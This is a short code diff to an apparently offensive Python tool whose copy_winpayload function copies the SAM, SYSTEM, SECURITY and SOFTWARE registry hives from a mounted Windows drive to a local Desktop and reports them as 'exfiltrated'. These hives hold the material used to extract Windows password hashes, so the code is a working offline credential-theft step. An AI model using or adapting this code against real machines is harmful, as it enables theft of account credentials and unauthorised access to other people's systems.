@@ -55,9 +55,11 @@ def copy_winpayload():
     # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/SAM', '~/Desktop')
-        shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '~/Desktop')
-        print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+        shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/zigmo/Desktop/SAM')
+        shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/zigmo/Desktop/SYSTEM')
+        shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/zigmo/Desktop/SECURITY')
+        shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
+        print('Sytem and Sam registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
     except FileNotFoundError:
         print('drive not exploitable')
     
